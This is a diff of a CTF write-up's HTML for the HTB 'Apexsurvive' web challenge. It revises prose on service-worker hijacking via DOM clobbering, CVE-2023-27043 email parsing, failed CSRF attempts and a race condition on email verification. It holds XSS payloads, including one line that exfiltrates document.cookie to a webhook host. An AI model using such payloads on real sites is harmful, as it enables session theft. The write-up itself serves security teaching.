@@ -301,7 +301,8 @@ If you just want the solution, here is the final attack chain." />
 │       supervisord.conf
 └───email-app+
 </code></pre><p>Upon inspection, there is so many files, so many routes and so many things going on compared to your typical web challenge.</p>
-<p>If we stick to our methodology, we will be able to systematically comb the application and build an effective, exploitable attack chain.</p>
+<p>This might be overwhelming, and many people would just decide to not continue at this point, but that should not deter us. In fact, a complex application indicates a bigger attack surface → higher chance of finding a vulnerability.</p>
+<p>Plus, we have a methodology, right? If we stick to our methodology, we will be able to systematically comb the application, find vulnerabilities, and build an attack chain.</p>
 <h3 id="dockerfile">Dockerfile<a href="#dockerfile" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Let&rsquo;s start with the <code>Dockerfile</code>. It gives us a high-level overview of the application and how it is set up. In fact, with experience, you can somewhat predict entire attack chains by just looking at the <code>Dockerfile</code>.</p>
 <p>Let&rsquo;s highlight our primary takeaways:</p>
@@ -756,11 +757,10 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">version</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">searchParams</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;version&#39;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">importScripts</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/workbox-cdn/releases/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">version</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/workbox-sw.js`</span>)
-</span></span></code></pre></div><p>The <code>host</code> and <code>version</code> variables are passed to <code>sw.js</code> to determine which version of Google&rsquo;s Workbox to import using <code>importScripts</code>.</p>
+</span></span></code></pre></div><p>The <code>host</code> and <code>version</code> variables are passed to <code>sw.js</code> to determine which version of Google&rsquo;s Workbox (some Google Service Worker script that helps with caching and other stuff) to import using <code>importScripts</code>.</p>
 <p>Importantly, <code>host</code> and <code>version</code> are extracted as the text contents of two hidden DOM elements based on their ID <code>#serviceWorkerHost</code> and <code>#serviceWorkerVersion</code> respectively.</p>
-<p>If we can inject an element with one of these ID, we will be able to <strong>hijack</strong> the service worker path leading to XSS.</p>
-<p>Looking around for DOM sinks where we can do that, we recognize two:</p>
-<p>Let&rsquo;s look for DOM sinks within the app&rsquo;s HTML templates, we identify two such instances:</p>
+<p>If we can inject an element with one of these IDs, we will be able to <strong>hijack</strong> the service worker path leading to XSS.</p>
+<p>To do that, let&rsquo;s look for DOM sinks within our HTML templates, luckily we identify two such instances:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e"># _navbar.html</span>
 </span></span><span style="display:flex;"><span>&lt;li&gt;&lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/challenge/settings&#34;</span>&gt;Account Settings <span style="color:#f92672">({{</span> user<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;username&#39;</span><span style="color:#f92672">]</span> | safe <span style="color:#f92672">}})</span>&lt;/a&gt;&lt;/li&gt;
 </span></span><span style="display:flex;"><span>
@@ -768,10 +768,10 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </span></span><span style="display:flex;"><span>let note <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#f92672">{{</span> product.note | safe <span style="color:#f92672">}}</span><span style="color:#e6db74">`</span>;
 </span></span><span style="display:flex;"><span>const clean <span style="color:#f92672">=</span> DOMPurify.sanitize<span style="color:#f92672">(</span>note, <span style="color:#f92672">{</span>FORBID_ATTR: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;id&#39;</span>, <span style="color:#e6db74">&#39;style&#39;</span><span style="color:#f92672">]</span>, USE_PROFILES: <span style="color:#f92672">{</span>html:true<span style="color:#f92672">}})</span>;
 </span></span></code></pre></div><blockquote>
-<p>In Jinja2, Flask&rsquo;s templating engine, the <code>safe</code> attribute does not <strong>make</strong> a value safe; instead, it is used to <strong>declare</strong> it as such, essentially telling Jinja2 to not escape the value since it is &ldquo;already safe&rdquo;. - me</p>
+<p>In Jinja2, Flask&rsquo;s templating engine, the <code>safe</code> attribute does not <strong>make</strong> a value safe; instead, it is used to <strong>declare</strong> a value as such, essentially telling Jinja2 to not escape the value since it is &ldquo;already safe&rdquo;. - me</p>
 </blockquote>
-<p>We do not have access to <code>addItem</code> functionality, this eliminates the second option.</p>
-<p>We are left with modifying our username, thankfully we are authorized to modify our profile settings. Additionally, the <code>bleach</code> whitelist allows us to use an <code>id</code> attribute within an <code>a</code> tag!</p>
+<p>We do not have access to the <code>addItem</code> functionality, this eliminates the second option.</p>
+<p>We are left with the username sink, and thankfully we are authorized to modify our profile settings. Additionally, the <code>bleach</code> whitelist allows us to use an <code>id</code> attribute within an <code>a</code> tag!</p>
 <ol>
 <li>
 <p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/sw-hijacking-1.png"></p>
@@ -782,8 +782,8 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </ol>
 <p>Our hypothesis was correct. We were able to control the <code>host</code> parameter and hijack the load path from the default <code>https://storage.googleapis.com</code> to our own non-existing <code>HIJACKEDSCRIPT</code> host.</p>
 <p>This attack is described <a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers">here</a> as <em>Service Worker Hijacking via DOM Clobbering</em> and is a method to achieve XSS.</p>
-<p>This attack remains impossible unless we find a way to make the bot visit our own profile page. This requires making him login, then making him visit the now-his malicious page populated with our Service Worker payload, but even then, he would lose his high-privileged token upon login, so the whole sequence is pointless.</p>
-<p>Unfortunately, this path came to a dead end.</p>
+<p>This attack remains impossible unless we find a way to make the bot visit our own profile page.</p>
+<p>Essentially, for this attack to succeed, we must get the bot to login, then make him visit the now-his malicious page populated with our Service Worker payload, but even then, he would lose his high-privileged token upon login, so the whole attack sequence is pointless, let alone feasible.</p>
 <p><strong>References:</strong></p>
 <ul>
 <li><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers</a></li>
@@ -796,9 +796,9 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 <p>A quick, local proof-of-concept:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;1&#34;</span>)}<span style="color:#e6db74">` //
 </span></span></span></code></pre></div><p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/xss-proof.png"></p>
-<p>Since the cookie had <code>HttpOnly: false</code>, we could exfiltrate the cookie of anyone who visits the product page with a similar payload:</p>
+<p>Since the cookie had <code>HttpOnly: false</code>, we could theoretically exfiltrate the cookie of anyone who visits the product page with a similar payload:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">$</span>{<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://webhook.site/REDACTED/&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(document.<span style="color:#a6e22e">cookie</span>))}<span style="color:#e6db74">` //
-</span></span></span></code></pre></div><p>We will keep this possibility in mind.</p>
+</span></span></span></code></pre></div><p>We will keep this in our pocket, maybe we will need it.</p>
 <h3 id="cross-side-request-forgery">Cross Side Request Forgery<a href="#cross-side-request-forgery" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Okay, we are unable to steal the bot&rsquo;s cookie due to Same-origin Policy (SOP) imposed by the cookie&rsquo;s <code>SameSite</code> restriction, but we still got the bot to visit our attacker-controlled page, that&rsquo;s big, right?</p>
 <p>Can we instruct the bot to do requests on our behalf?</p>
@@ -827,7 +827,7 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;price&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$9.99&#34;</span> /&gt;
 </span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;description&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;CSRF added product...&#34;</span> /&gt;
 </span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;imageURL&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.cakedeco.com/390562.gif&#34;</span> /&gt;
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;note&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;XSS payload&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;note&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;${alert(&#39;1&#39;)}` //&#34;</span> /&gt;
 </span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;seller&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aelmo&#34;</span> /&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
 </span></span><span style="display:flex;"><span>
@@ -836,7 +836,7 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
-</span></span></code></pre></div><p>This - obviously - did not work, first because of <code>@antiCSRF</code> which requires us to have the user&rsquo;s <code>antiCSRFToken</code> before we can submit the form, but even if we were to leak the <code>antiCSRFToken</code> somehow, the <code>SameSite: Strict</code> cookie restriction will prevent the browser from passing the cookie (even though the form target is the cookie&rsquo;s issuing origin), because the request initiating origin is different.</p>
+</span></span></code></pre></div><p>This - obviously - did not work, first because of <code>@antiCSRF</code> which requires us to have the user&rsquo;s <code>antiCSRFToken</code> before we can submit the form, but even if we were to leak the <code>antiCSRFToken</code> somehow, the <code>SameSite: Strict</code> cookie restriction will prevent the browser from passing the cookie (even though the form&rsquo;s target is the cookie&rsquo;s issuing origin), because the request initiating origin is different.</p>
 <p>Another attempt that I have tried, was attempting to fetch one of the site&rsquo;s pages using a basic GET request:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
@@ -860,11 +860,11 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 <li><a href="https://thesecurityvault.com/understanding-cors-and-sop-bypass-techniques/">https://thesecurityvault.com/understanding-cors-and-sop-bypass-techniques/</a></li>
 </ul>
 <h3 id="honorable-mentions">Honorable Mentions<a href="#honorable-mentions" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<p><code>uuidv4</code> tokens are relied on throughout the app for confirmation tokens and CSRF tokens. Could we abuse this somehow to perform &ldquo;UUIDv4 prediction&rdquo;?</p>
-<p>Answer is no.</p>
+<p><code>uuidv4</code> tokens are relied on throughout the app to generate confirmation tokens and CSRF tokens. Could we abuse this somehow to perform &ldquo;UUIDv4 prediction&rdquo;?</p>
+<p>Short answer is: no.</p>
 <p>The <code>query</code> call in <code>/login</code> was the only one to include an <code>f''</code> literal along the <code>%s</code> prepared statement placeholders, could this be exploited somehow?</p>
 <pre tabindex="0"><code class="language-pthon" data-lang="pthon">user = query(f&#39;SELECT * FROM users WHERE email=%s OR unconfirmedEmail=%s AND password=%s&#39;, (email, email, password, ) ,one=True)
-</code></pre><p>Answer is no.</p>
+</code></pre><p>Short answer is: no.</p>
 <h2 id="chapter-5-internal-clarity">Chapter 5: Internal Clarity<a href="#chapter-5-internal-clarity" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>After so many failed attempts at elevating our privileges, we decide to establish the facts acquired so far:</p>
 <ol>
@@ -878,7 +878,7 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/attack-chain-incomplete.png"></p>
 <p>This nicely illustrates what we discussed earlier about white-box testing where we might find an entire attack chain, while the chain&rsquo;s entry point is yet inaccessible to us.</p>
 <p>Let&rsquo;s focus on gaining the <code>isInternal</code> privilege since everything seems to depend on it. How do we get <code>isInternal</code>?</p>
-<p>A <code>Ctrl+Shift+F</code> in the codebase for <code>isInternal</code> shows us the <em>only</em> function in the app that sets <code>isInternal</code> to <code>true</code>:</p>
+<p>A <code>Ctrl+Shift+F</code> (underrated tool) in the codebase for <code>isInternal</code> shows us the <em>only</em> function in the app that sets <code>isInternal</code> to <code>true</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verifyEmail</span>(token):
 </span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> query(<span style="color:#e6db74">&#39;SELECT * from users WHERE confirmToken = </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, (token, ), one<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
 </span></span><span style="display:flex;"><span>
@@ -894,18 +894,21 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span></code></pre></div><p><code>database.py/verifyEmail</code> is responsible for verifying our emails.</p>
-<p>However, <code>verifyEmail</code> has an interesting condition: if an email is within the <code>apexsurvive.htb</code>  domain, it is considered to be internal and is given the <code>isInternal</code> privilege on verification.</p>
-<p>A quick check shows us that we can register any email we want. There is no checks on registration or even profile updates, which is realistic; however, similar to a real application, we would be unable to verify our email since we do not have access to an <code>@apexsurvive.htb</code> inbox.</p>
+</span></span></code></pre></div><p><code>database.py/verifyEmail</code> is the function responsible for verifying our emails.</p>
+<p>However, <code>verifyEmail</code> contains an interesting condition: if an email is within the <code>apexsurvive.htb</code>  domain, it is considered to be internal and is given the <code>isInternal</code> privilege upon verification.</p>
+<p>A quick check shows us that we actually can register any email we want. There is no checks on registration or even profile updates, which mimics a real-life application; however, just like in real applications, we would be unable to verify our arbitrarily-picked email since we do not have access to its inbox.</p>
+<p>That&rsquo;s literally why we have email verification, to prove ownership of a claimed email.</p>
 <h3 id="parseaddr-and-rfc2822">parseaddr and RFC2822<a href="#parseaddr-and-rfc2822" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<p>I suspected the <code>parseaddr</code> function since its output was relied on for the check, a search yielded very interesting stuff on a recent <code>parseaddr</code> vulnerability that could result in an authentication bypass, <strong>CVE-2023-27043</strong>:</p>
+<p>I suspected the <code>parseaddr</code> function was involved, since its output was the primary arbiter of the hostname. The whole check was based on <code>parseaddr</code>&rsquo;s output.</p>
+<p>A quick search yielded very interesting stuff on a recent <code>parseaddr</code> vulnerability that could result in an authentication bypass, <strong>CVE-2023-27043</strong>:</p>
+<p>The CVE reads:</p>
 <blockquote>
 <p>&ldquo;The email module of Python through 3.11.3 incorrectly parses e-mail addresses that contain a special character. The wrong portion of an RFC2822 header is identified as the value of the addr-spec. In some applications, an attacker can bypass a protection mechanism in which application access is granted only after verifying receipt of e-mail to a specific domain (e.g., only @company.example.com addresses may be used for signup). This occurs in email/_parseaddr.py in recent versions of Python.&rdquo;</p>
 <ul>
 <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-27043">https://nvd.nist.gov/vuln/detail/CVE-2023-27043</a></li>
 </ul>
 </blockquote>
-<p>Our docker instance is running Alpine <code>3.14.1</code> which has <code>Python 3.9.17</code>, confirming that <code>parseaddr</code> is most likely vulnerable.</p>
+<p>Our docker instance is running Alpine <code>3.14.1</code> which has <code>Python 3.9.17</code>, confirming that <code>parseaddr</code> most likely is vulnerable.</p>
 <p>The vulnerability says that if we control the address&rsquo; realname, we get to control the hostname.</p>
 <p>For example: <code>alice@example.org)&lt;bob@example.org&gt;</code> evaluates to <code>alice@example.org</code> when parsed, even though it should evaluate to <code>bob@example.org</code> according to the RFC2822.</p>
 <p>My hypothesis was that I might be able to leverage a disparity between <code>parseaddr</code>&rsquo;s evaluated hostname and the <code>flask-mail/MailHog</code> send functionality.</p>
@@ -939,16 +942,16 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </span></span><span style="display:flex;"><span>parseaddr res: <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;hacker@apexsurvive.htb&#39;</span><span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># a compliant parser should return this:</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># (&#39;hacker@apexsurvive.htb]&#39;, &#39;test@email.htb&#39;)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># instead; according to RFC2822</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># according to RFC2822</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">==================</span>
 </span></span><span style="display:flex;"><span>regex did NOT pass
 </span></span><span style="display:flex;"><span>parse result: <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;hacker&#39;</span>, <span style="color:#e6db74">&#39;apexsurvive.htb&#39;</span><span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>hostname: apexsurvive.htb
 </span></span></code></pre></div><p>While the idea is not so bad in essence - according to unbiased me 😅 - it ended up failing for many reasons:</p>
 <ul>
-<li>Research showed that <code>flask-mail</code>, <code>smtplib</code> and Python&rsquo;s <code>MailHog</code> all make use of <code>parseaddr</code> under the hood, so they all share the parsing discrepancy.</li>
-<li><code>@sanitizeInput</code> would escape <code>&lt; &gt;</code> required in this parsing vulnerability</li>
-<li>The <code>checkEmail</code> regex-based check would prevent any bypass anyways.</li>
+<li>Further research showed that <code>flask-mail</code>, <code>smtplib</code> and Python&rsquo;s <code>MailHog</code> all make use of <code>parseaddr</code> under the hood, so they all share the parsing discrepancy.</li>
+<li><code>@sanitizeInput</code> would escape <code>&lt; &gt;</code> required in this parsing vulnerability anyways.</li>
+<li>The <code>checkEmail</code> regex-based check would prevent address manipulation anyways.</li>
 </ul>
 <p>Original CPython issue:</p>
 <ul>
@@ -1056,7 +1059,7 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 <p>Sometimes, security research becomes an exercise of <em>uncertainty management</em>; an exercise in treading the unknown, following a hazy, obscure path without validation.</p>
 <p>And while a shot in the dark could work sometime, we do not want to rely on chance. We will always want to illuminate our path to enable deliberate, effective action.</p>
 <p>This <em>illumination</em> can be done through modelling and experimentation or via secondary research.</p>
-<p>I started to learn more about race conditions.</p>
+<p>I started to read about race conditions.</p>
 <p>From <a href="https://book.hacktricks.xyz/pentesting-web/race-condition">Hack Tricks</a>:</p>
 <blockquote>
 <p>&ldquo;The main hurdle in taking advantage of race conditions is making sure that multiple requests are handled at the same time, with very little difference in their processing times—ideally, less than 1ms.&rdquo;</p>
@@ -1073,8 +1076,8 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 <li><input checked="" disabled="" type="checkbox"> We are editing a record, rather than appending.</li>
 <li><input checked="" disabled="" type="checkbox"> The two racing operations are keyed on a fixed column, <code>id</code>!</li>
 </ul>
-<p>I think I devoured that entire article, it is very concise, on-point and masterpiece to be honest. It was not just extremely relevant to our app, it also beautifully demonstrated how to reason about and approach race conditions or any time-sensitive vulnerability in general.</p>
-<p>A very important section explained Kettle&rsquo;s RC finding in Devise, a popular authentication framework in the Ruby ecosystem:
+<p>I think I devoured that entire article, it is very concise, on-point and a total masterpiece if I am being honest. Not only was it extremely relevant for our app, it was also to provide a framework for discovering, reasoning about and approaching race conditions and any time-sensitive vulnerability in general.</p>
+<p>A very important section explained Kettle&rsquo;s race condition finding in Devise, a popular authentication framework in the Ruby ecosystem:
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/devise-rc.png"></p>
 <p>The similarity is so stark, down to variable names, and I cannot help but think the challenge author must have taken some inspiration from this exact article.</p>
 <p>At this point, we have successfully persevered through uncertainty. We are no longer flailing at the dark, we know what we are dealing with and it looks more promising than ever.</p>
@@ -1088,8 +1091,8 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </span></span><span style="display:flex;"><span>            sendEmail(decodedToken<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;id&#39;</span>), user[<span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>])
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
 </span></span></code></pre></div><p>Let&rsquo;s also added debug points to all critical functions to see the precise execution timeline of our race condition.</p>
-<p>Then I attempted to manually trigger the race condition, starting with <code>test@email.htb</code>, triggering <code>sendVerification</code>, then updating email to <code>hacker@apexsurvive.htb</code> within the sleep duration, before the email is sent.</p>
-<p>In the logs, everything went exactly as our planned:</p>
+<p>I then attempted to manually trigger the race condition, setting initial state to use <code>test@email.htb</code>, triggering <code>sendVerification</code>, then updating email to <code>hacker@apexsurvive.htb</code> within the sleep duration, before the email is sent.</p>
+<p>In the logs, everything went exactly as our annotated timeline above:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">46</span>.<span style="color:#ae81ff">811049</span> [<span style="color:#f92672">+</span>] <span style="color:#f92672">/</span>sendVerification: Entered
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">46</span>.<span style="color:#ae81ff">811753</span> [<span style="color:#f92672">+</span>] sendVerification grabbed <span style="color:#66d9ef">user</span> <span style="color:#960050;background-color:#1e0010">{</span><span style="color:#e6db74">&#39;id&#39;</span>: <span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#39;email&#39;</span>: <span style="color:#66d9ef">None</span>, <span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#e6db74">&#39;password&#39;</span>, <span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>: <span style="color:#e6db74">&#39;test@email.htb&#39;</span>, <span style="color:#e6db74">&#39;confirmToken&#39;</span>: <span style="color:#e6db74">&#39;e3ab2f88-385c-4b4f-aef0-d9aa94cf81d7&#39;</span>, <span style="color:#e6db74">&#39;fullName&#39;</span>: <span style="color:#e6db74">&#39;aaa&#39;</span>, <span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;bbb&#39;</span>, <span style="color:#e6db74">&#39;isConfirmed&#39;</span>: <span style="color:#e6db74">&#39;unverified&#39;</span>, <span style="color:#e6db74">&#39;isInternal&#39;</span>: <span style="color:#e6db74">&#39;false&#39;</span>, <span style="color:#e6db74">&#39;isAdmin&#39;</span>: <span style="color:#e6db74">&#39;false&#39;</span><span style="color:#960050;background-color:#1e0010">}</span> 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">46</span>.<span style="color:#ae81ff">811797</span> [<span style="color:#f92672">+</span>] sendVerification: Sleeping <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">5</span> seconds
@@ -1106,12 +1109,12 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">51</span>.<span style="color:#ae81ff">816885</span> [<span style="color:#f92672">+</span>] sendEmail: Querying token...
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">51</span>.<span style="color:#ae81ff">817290</span> [<span style="color:#f92672">+</span>] sendEmail: Grabbed token: <span style="color:#960050;background-color:#1e0010">{</span><span style="color:#e6db74">&#39;unconfirmedEmail&#39;</span>: <span style="color:#e6db74">&#39;test@email.htb&#39;</span>, <span style="color:#e6db74">&#39;confirmToken&#39;</span>: <span style="color:#e6db74">&#39;e3ab2f88-385c-4b4f-aef0-d9aa94cf81d7&#39;</span><span style="color:#960050;background-color:#1e0010">}</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">51</span>.<span style="color:#ae81ff">818532</span> [<span style="color:#f92672">+</span>] sendEmail: Actually sending email now...
-</span></span></code></pre></div><p>But looking at our inbox, nothing happens. The email that gets sent to us contains <code>test@email.htb</code> and his token. What?!</p>
+</span></span></code></pre></div><p>But looking at our inbox, nothing happens. The email sent to us is typical, containing <code>test@email.htb</code> and its token. What?!</p>
 <p>Shouldn&rsquo;t <code>sendEmail: Querying token...</code> at <code>15:15:51.81</code> be querying the newly generated token <code>696a019c-e4d2-4457-b53b-d73b6605463b</code>?</p>
 <p>How is the old token, which should have been overwritten in the database at <code>15:15:48</code> by <code>updateProfile: SQL commit()</code>, still available?</p>
 <p>This, I have no answer for.</p>
-<p>I suspect it is something to do with MariaDB transactions or perhaps related to the way <code>sleep</code> works. Either way, I found this behavior perplexing. If someone has an explanation, please let me know in the comments.</p>
-<p>I tried to automate this process using <code>threading</code>, looked up samples using <code>aiohttp</code> and <code>asyncio</code>, but to no avail, same result.</p>
+<p>I suspect it is something to do with MariaDB transactions, it might be related to the way <code>sleep</code> works, or perhaps I misidentified the race condition&rsquo;s critical region. Either way, I found this behavior perplexing. If someone has an explanation, please let me know in the comments.</p>
+<p>Next, I tried to automate this process using <code>threading</code>, maybe the manual approach was not fast enough? It shouldn&rsquo;t have to be fast anyways since we added a sleep there. Anyways, I still looked up samples using <code>aiohttp</code> and <code>asyncio</code> for concurrency, but to no avail, same result.</p>
 <h3 id="winning-the-race">Winning the Race<a href="#winning-the-race" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Few more hours passed and I am still staring at the same code. I know there is a race condition, I am just unable to exploit it.</p>
 <p>In &ldquo;Smashing the state machine&rdquo; the author mentioned how we could minimize the effects of network jitter by abusing network protocols.</p>
@@ -1123,13 +1126,13 @@ This important control uses <code>bleach</code>, a popular, whitelist-based sani
 <li>James Kettle, Smashing the state machine</li>
 </ul>
 </blockquote>
-<p>From the same article, turns out we could perform a last-byte sync attack using <strong>Turbo Intruder</strong>, a Burp Suite plugin written by Kettle himself.</p>
+<p>From the same article, turns out we could perform a last-byte sync attack using <strong>Turbo Intruder</strong>, a Burp Suite extension written by Kettle himself.</p>
 <blockquote>
-<p>I later learnt that this feature is available in <strong>Repeater</strong> where you could group multiple requests before sending them in parallel.</p>
+<p>I later found that this feature is available in good ol&rsquo; <strong>Repeater</strong> where you could group multiple requests before sending them in parallel. - me</p>
 </blockquote>
 <p>So, let&rsquo;s send a request over to Turbo Intruder:
 <img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/turbo-intruder-send.png"></p>
-<p>With a bit of experimentation, I wrote a script based off Turbo Intruder&rsquo;s <code>race-multi-endpoint</code> example:</p>
+<p>With a bit of experimentation, I wrote a script based off Turbo Intruder&rsquo;s <code>race-multi-endpoint</code> preset:</p>
